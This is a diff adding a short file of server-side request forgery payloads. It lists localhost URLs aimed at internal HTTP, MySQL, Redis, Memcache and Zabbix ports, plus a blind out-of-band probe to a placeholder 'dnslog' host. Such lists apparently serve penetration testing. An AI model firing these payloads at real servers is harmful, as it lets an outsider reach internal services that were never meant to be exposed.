@@ -1,0 +1,16 @@
+# SSRF payload
+
+# HTTP
+http://127.0.0.1:80/
+http://127.0.0.1:8080/
+# MySQL
+http://127.0.0.1:3306/
+# Redis
+http://127.0.0.1:6379/
+# Memcache
+http://127.0.0.1:11211/
+# Zabbix
+http://127.0.0.1:10050/
+
+# blind
+http://dnslog/
